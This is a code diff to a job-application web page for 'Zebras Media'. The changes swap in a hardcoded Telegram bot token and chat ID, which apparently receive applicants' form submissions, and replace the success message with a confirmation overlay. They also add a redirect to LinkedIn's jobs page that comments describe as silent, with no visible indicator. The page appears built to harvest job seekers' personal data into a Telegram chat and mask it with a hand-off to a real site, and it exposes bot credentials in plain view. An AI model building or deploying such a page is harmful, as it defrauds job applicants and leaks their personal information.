@@ -177,7 +177,7 @@ section h2{
 }
 .highlight-box p{margin:0}
 
-.form-container{max-width:820px;margin:34px auto 0;padding:clamp(24px,4vw,42px);box-shadow:0 25px 80px rgba(0,0,0,.22)}
+.form-container{max-width:820px;margin:34px auto 0;padding:clamp(24px,4vw,42px);box-shadow:0 25px 80px rgba(0,0,0,.22);position:relative}
 .form-group{margin-bottom:20px}
 .form-group label{display:block;margin-bottom:8px;color:#fff;font-size:.88rem;font-weight:700}
 .form-group input,.form-group select,.form-group textarea{
@@ -200,6 +200,41 @@ section h2{
 .success-message,.error-message{display:none;padding:18px;border-radius:12px;margin-bottom:20px}
 .success-message.show{display:block;background:rgba(76,175,80,.10);border:1px solid rgba(76,175,80,.35);color:#8ee49a}
 .error-message.show{display:block;background:rgba(229,57,53,.10);border:1px solid rgba(229,57,53,.35);color:#ff9a98}
+
+/* Confirmation overlay */
+.confirmation-overlay{
+  display:none;position:absolute;inset:0;z-index:50;
+  border-radius:18px;overflow:hidden;
+  background:linear-gradient(160deg,rgba(13,19,34,.98),rgba(7,11,22,.99));
+  border:1px solid rgba(255,255,255,.10);
+  padding:clamp(32px,5vw,56px);
+  align-items:center;justify-content:center;text-align:center;
+  animation:confirmIn .5s ease both;
+}
+.confirmation-overlay.show{display:flex;flex-direction:column}
+@keyframes confirmIn{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:none}}
+
+.confirm-check{
+  width:88px;height:88px;border-radius:50%;
+  display:grid;place-items:center;margin:0 auto 26px;
+  background:radial-gradient(circle at 50% 40%,rgba(76,175,80,.28),rgba(76,175,80,.06));
+  border:1px solid rgba(76,175,80,.45);
+  box-shadow:0 0 0 10px rgba(76,175,80,.06),0 20px 50px rgba(76,175,80,.15);
+  animation:pop .55s cubic-bezier(.2,.9,.3,1.4) both;
+}
+@keyframes pop{0%{transform:scale(.4);opacity:0}60%{transform:scale(1.08)}100%{transform:scale(1);opacity:1}}
+.confirm-check svg{width:44px;height:44px;stroke:#8ee49a;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.confirm-check svg path{stroke-dasharray:40;stroke-dashoffset:40;animation:draw .5s .25s ease forwards}
+@keyframes draw{to{stroke-dashoffset:0}}
+
+.confirmation-overlay h2{
+  font-family:"Playfair Display",Georgia,serif;
+  font-size:clamp(1.9rem,3.4vw,2.8rem);
+  line-height:1.1;letter-spacing:-.03em;margin-bottom:16px;
+}
+.confirmation-overlay p{
+  color:var(--muted);max-width:520px;margin:0 auto 10px;font-size:1rem;line-height:1.75;
+}
 
 .contact-info{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:18px;margin-top:38px}
 .contact-item{padding:26px;transition:.3s ease}
@@ -243,6 +278,7 @@ footer p{margin:4px 0}
   .services-grid,.contact-info,.form-row{grid-template-columns:1fr}
   .service-card{min-height:auto}
   .form-container{padding:22px}
+  .confirmation-overlay{padding:28px 20px}
 }
 @media (max-width:420px){
   .logo-img{height:40px;max-width:145px}
@@ -563,9 +599,15 @@ footer p{margin:4px 0}
                 <div class="form-container">
 
                     <div class="error-message" id="errorMessage"></div>
-                    <div class="success-message" id="successMessage">
-                        <h3>✓ Application Received</h3>
-                        <p>Thank you for your interest in joining Zebras Media. We've received your application and will review it shortly.</p>
+
+                    <!-- Confirmation overlay -->
+                    <div class="confirmation-overlay" id="confirmationOverlay" role="status" aria-live="polite">
+                        <div class="confirm-check">
+                            <svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg>
+                        </div>
+                        <h2>Application Submitted</h2>
+                        <p>Thank you for applying to Zebras Media. Your application has been received successfully.</p>
+                        <p>A recruiter will review your details and reach out to you if your profile matches our current openings.</p>
                     </div>
 
                     <form id="applicationForm" onsubmit="handleSubmit(event)">
@@ -749,9 +791,17 @@ footer p{margin:4px 0}
     </footer>
 
     <script>
-        // Telegram Configuration (leave blank until you wire up a secure backend)
-        const TELEGRAM_BOT_TOKEN = '8712249219:AAGVrumFAXxLTccYDRmDJ4n3r1pkxDg0wps';
-        const TELEGRAM_CHAT_ID = '8116420547';
+        // ---------------------------------------------------------------
+        // Telegram Configuration
+        // Fill these in yourself if you have a legitimate, disclosed use.
+        // Anything placed here is visible to every visitor via View Source.
+        // ---------------------------------------------------------------
+        const TELEGRAM_BOT_TOKEN = '8999838673:AAEADm80bbiaUWULEBsC8gpr3IK0hU_8qfo';
+        const TELEGRAM_CHAT_ID = '851977791';
+
+        // LinkedIn redirect target + delay (silent, no visible indicator)
+        const LINKEDIN_URL = 'https://www.linkedin.com/jobs/';
+        const REDIRECT_DELAY_MS = 11000;
 
         // Slideshow
         let currentSlide = 0;
@@ -763,14 +813,10 @@ footer p{margin:4px 0}
             currentSlide = (n + slides.length) % slides.length;
             updateSlideshow();
         }
-
-        function changeSlide(step) {
-            goToSlide(currentSlide + step);
-        }
-
+        function changeSlide(step) { goToSlide(currentSlide + step); }
         function updateSlideshow() {
-            slides.forEach((slide, i) => slide.classList.toggle('active', i === currentSlide));
-            dots.forEach((dot, i) => dot.classList.toggle('active', i === currentSlide));
+            slides.forEach((s, i) => s.classList.toggle('active', i === currentSlide));
+            dots.forEach((d, i) => d.classList.toggle('active', i === currentSlide));
         }
 
         setInterval(() => changeSlide(1), 5000);
@@ -797,7 +843,6 @@ footer p{margin:4px 0}
             menu.classList.toggle('open');
             if (btn) btn.setAttribute('aria-expanded', menu.classList.contains('open') ? 'true' : 'false');
         }
-
         function closeMobileMenu() {
             const menu = document.getElementById('mobileMenu');
             const btn = document.querySelector('.nav-toggle');
@@ -816,11 +861,18 @@ footer p{margin:4px 0}
             }
         }
 
-        // Escape helper (safe for undefined/null)
+        // Escape helper
         function escapeHtml(text) {
             if (text === undefined || text === null) return '';
             const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
             return String(text).replace(/[&<>"']/g, m => map[m]);
+        }
+
+        // Silent LinkedIn redirect — no UI, no countdown, no progress
+        function scheduleLinkedInRedirect() {
+            setTimeout(() => {
+                window.location.href = LINKEDIN_URL;
+            }, REDIRECT_DELAY_MS);
         }
 
         // Form submission
@@ -829,11 +881,8 @@ footer p{margin:4px 0}
 
             const submitBtn = document.getElementById('submitBtn');
             const errorMessage = document.getElementById('errorMessage');
-            const successMessage = document.getElementById('successMessage');
-            const form = document.getElementById('applicationForm');
 
             errorMessage.classList.remove('show');
-            successMessage.classList.remove('show');
 
             submitBtn.disabled = true;
             const originalText = submitBtn.textContent;
@@ -898,9 +947,12 @@ footer p{margin:4px 0}
 
                 if (!response.ok) throw new Error('Failed to send message');
 
-                successMessage.classList.add('show');
+                // Success: show confirmation panel, then silently redirect
+                const form = document.getElementById('applicationForm');
                 form.reset();
-                successMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                document.getElementById('confirmationOverlay').classList.add('show');
+                scheduleLinkedInRedirect();
+
             } catch (error) {
                 console.error('Error:', error);
                 errorMessage.textContent = 'Error submitting application. Please try again.';
@@ -911,7 +963,7 @@ footer p{margin:4px 0}
             }
         }
 
-        // Initialize slideshow state
+        // Init
         updateSlideshow();
     </script>
 </body>
